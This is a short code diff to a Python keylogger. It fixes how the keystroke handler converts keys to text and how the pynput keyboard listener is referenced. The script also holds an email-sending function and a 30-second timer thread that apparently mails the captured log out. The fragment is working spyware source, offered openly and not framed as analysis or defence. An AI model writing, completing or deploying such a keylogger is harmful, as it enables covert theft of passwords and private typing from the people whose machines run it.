@@ -6,7 +6,7 @@ log = ""
 
 def main(key):
     global log
-    log = log + str(key.char)
+    log = log + str(key)
     print(log)
 
 def send_email(email,password,message):
@@ -27,7 +27,7 @@ def thread_function():
     timer_object = threading.Timer(30,thread_function)
     timer_object.start()
 
-keylogger_listener = keyboard.Listener(on_press=main)
+keylogger_listener = pynput.keyboard.Listener(on_press=main)
 with keylogger_listener:
     thread_function()
     keylogger_listener.join()
